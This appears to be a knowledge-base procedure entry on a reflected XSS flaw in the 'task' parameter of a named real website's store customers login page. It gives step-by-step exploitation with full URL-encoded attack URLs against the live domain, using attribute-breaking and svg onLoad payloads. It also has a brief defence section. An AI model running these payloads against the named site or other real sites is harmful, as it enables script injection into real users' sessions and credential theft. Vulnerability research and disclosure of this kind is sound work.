---
tags:
  - xss
  - reflected-xss
  - attribute-injection
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-14T03:16:14.397Z'
skill_level: intermediate
impact_level: high
detection_risk: low
sub_techniques: []
id: 0dbda6e8-e778-4a18-89e5-f8e8d6de2862
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# XSS-Injection-in-Store-Customers-Login-Task

## Summary

This procedure targets a reflected XSS flaw in the MapsMarker.com store customers login page by injecting payloads into the 'task' parameter, enabling script execution on interaction or load to compromise user sessions.

## Description

The /store/customers/index.php endpoint fails to validate query parameters like 'task', allowing malformed inputs to inject into HTML attributes or tags. This leads to reflected XSS where payloads execute in the context of the logged-in user's browser, facilitating phishing or credential theft. The site uses PHP, and the issue arises from direct reflection without escaping.

## Requirements

1. Web browser for testing interactions like mouseover
2. URL encoder for payload preparation
3. Public access to the store customers page

## Defense

Defensive measures and detection strategies:

- Sanitize all query parameters with whitelisting for expected values (e.g., 'login' only)
- Encode outputs in HTML contexts using PHP's htmlspecialchars
- Deploy CSP to restrict script sources
- Log and alert on suspicious parameter patterns via server logs

## Objectives

1. Trigger JavaScript execution via user interaction
2. Expose risks to authenticated customer sessions
3. Confirm vulnerability for remediation

## Instructions

### Step 1: Access the Base Endpoint

**Context**: Load the customers page to observe the 'task' parameter usage.

Navigate to: https://www.mapsmarker.com/store/customers/index.php/?task=login

Check page source for reflection of 'task'.

### Step 2: Inject Attribute-Breaking Payload

**Context**: Craft a payload to break out of an HTML attribute and inject an event handler.

Payload example: " onmouseover=prompt(9) //

Encoded: %22%20onmouseover%3Dprompt%289%29%20//

Full URL: https://www.mapsmarker.com/store/customers/index.php/?task=login%22%20onmouseover%3Dprompt%289%29%20//

Load and hover over the reflected element.

> Execution occurs on mouseover, displaying a prompt. For non-interactive, use <svg onLoad=prompt(9)> in a tag-breaking context.

### Step 3: Test Alternative Payloads

**Context**: Verify robustness with variations.

Try: x'><svg onLoad=prompt(9)>

Encoded URL: https://www.mapsmarker.com/store/customers/index.php/?task=login%22%3E%3Csvg%20onLoad%3Dprompt%289%29%3E

**Expected Output**: Script runs on load or interaction.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[xss]]
- [[reflected-xss]]
